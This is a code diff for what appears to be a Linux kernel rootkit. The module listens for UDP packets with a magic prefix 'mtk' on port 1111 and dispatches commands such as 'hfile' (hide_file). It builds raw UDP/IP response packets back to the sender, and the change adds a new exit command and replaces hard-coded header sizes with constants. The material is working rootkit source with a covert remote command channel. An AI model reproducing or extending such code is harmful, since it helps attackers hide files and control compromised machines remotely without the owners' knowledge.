@@ -11,6 +11,9 @@
 #define CMD_MAGIC ("mtk")
 #define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
 #define CMD_PORT (1111)
+#define CMD_AMOUNT (5)
+#define RESPONSE_DATA_LEN (3)
+#define RESPONSE_HEADER_LEN (sizeof(struct udphdr) + sizeof(struct iphdr) + ETH_HLEN)
 
 typedef u16 job_id_t;
 
@@ -19,8 +22,12 @@ struct cmd_type {
     int (*func)(const char *path);
 };
 
-int cmds_len = 5;
-struct cmd_type cmds[] = {
+static int exit_func(const char *_) {
+    MRK_exit();
+    return 0;
+}
+
+struct cmd_type cmds[CMD_AMOUNT] = {
     {
         "hfile",
         hide_file
@@ -57,17 +64,15 @@ static int send_response(
     struct udphdr *udph;
     struct ethhdr *eth;
     struct sk_buff *skb;
-    int data_len = 3;
     char *data;
-    int header_len = sizeof(struct udphdr) + 5 * 4 + ETH_HLEN;
     printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
-    skb = alloc_skb(data_len + header_len, GFP_ATOMIC);
+    skb = alloc_skb(RESPONSE_DATA_LEN + RESPONSE_HEADER_LEN, GFP_ATOMIC);
     if (!skb) {
         printk(KERN_INFO "failed allocating skb\n");
         return -1;
     }
-    skb_reserve(skb, header_len);
-    data = skb_put(skb, data_len);
+    skb_reserve(skb, RESPONSE_HEADER_LEN);
+    data = skb_put(skb, RESPONSE_DATA_LEN);
 
     // put response data.
     *(unsigned short *)data = job_id;
@@ -78,16 +83,16 @@ static int send_response(
     udph = udp_hdr(skb);
     udph->source = htons(CMD_PORT);
     udph->dest = remote_port;
-    udph->len = htons(data_len + sizeof(struct udphdr));
+    udph->len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr));
     udph->check = 0;
     udph->check = csum_tcpudp_magic(
         local_ip,
         remote_ip,
-        data_len + sizeof(struct udphdr),
+        RESPONSE_DATA_LEN + sizeof(struct udphdr),
         IPPROTO_UDP,
         csum_partial(
             udph,
-            data_len + sizeof(struct udphdr),
+            RESPONSE_DATA_LEN + sizeof(struct udphdr),
             0
         )
     );
@@ -97,13 +102,13 @@ static int send_response(
     skb_push(skb, sizeof(*iph));
     skb_reset_network_header(skb);
     iph = ip_hdr(skb);
-    iph->version = 4;
-    iph->ihl = 5;
+    iph->version = IPVERSION;
+    iph->ihl = sizeof(struct iphdr) / 4;
     iph->tos = 0;
-    iph->tot_len = htons(data_len + sizeof(struct udphdr) + 5 * 4);
+    iph->tot_len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr) + sizeof(struct iphdr));
     iph->id       = 0;
     iph->frag_off = 0;
-    iph->ttl      = 64;
+    iph->ttl      = IPDEFTTL;
     iph->protocol = IPPROTO_UDP;
     iph->check    = 0;
     iph->saddr = local_ip;
@@ -173,7 +178,7 @@ static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
     int i;
     struct cmd_type *cmd;
     
-    for (i = 0; i < cmds_len; i++) {
+    for (i = 0; i < CMD_AMOUNT; i++) {
         cmd = cmds + i;
         if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
             return cmd;
